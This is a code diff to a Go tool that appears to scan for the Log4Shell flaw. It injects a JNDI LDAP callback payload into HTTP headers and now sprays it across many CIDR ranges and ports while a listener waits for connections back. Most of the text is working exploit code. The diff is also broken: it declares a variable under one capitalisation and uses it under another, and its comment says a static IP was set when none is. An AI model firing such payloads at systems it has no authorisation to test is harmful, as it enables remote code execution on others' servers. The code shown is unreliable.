@@ -65,8 +65,10 @@ func request(destCIDR string, destPort string, sourceIp string, sourcePort strin
 				return fmt.Errorf("Got error %s", err.Error())
 		}
 		var lh string = "${jndi:ldap:"
+		// I changed the following to my static public IP on my EC2 instance
+		var publicSourceIP string = sourceIp
 		var rh string = "blu}"
-		var payload string = fmt.Sprintf("%v//%v:%v/%v", lh, sourceIp, sourcePort, rh)
+		var payload string = fmt.Sprintf("%v//%v:%v/%v", lh, publicSourceIp, sourcePort, rh)
 		// Poison a whole bunch
 		req.Header.Set("User-Agent", payload)
 		req.Header.Add("X-Api-Version", payload)
@@ -128,7 +130,15 @@ func main() {
 	defer l.Close()
 
 	log.Printf("Listening on " + sourceIp + ":" + sourcePort + "\n---------")
-	request(destCIDR, destPort, sourceIp, sourcePort)
+
+	// split destCIDR, destPort
+	dCIDRs := strings.Split(destCIDR, ",")
+	dPorts := strings.Split(destPort, ",")
+	for _, dCIDR := range dCIDRs {
+                for _, dPort := range dPorts {
+	                request(dCIDR, dPort, sourceIp, sourcePort)
+                }
+        }
 	for {
 			// Listen for an incoming connection.
 			conn, err := l.Accept()
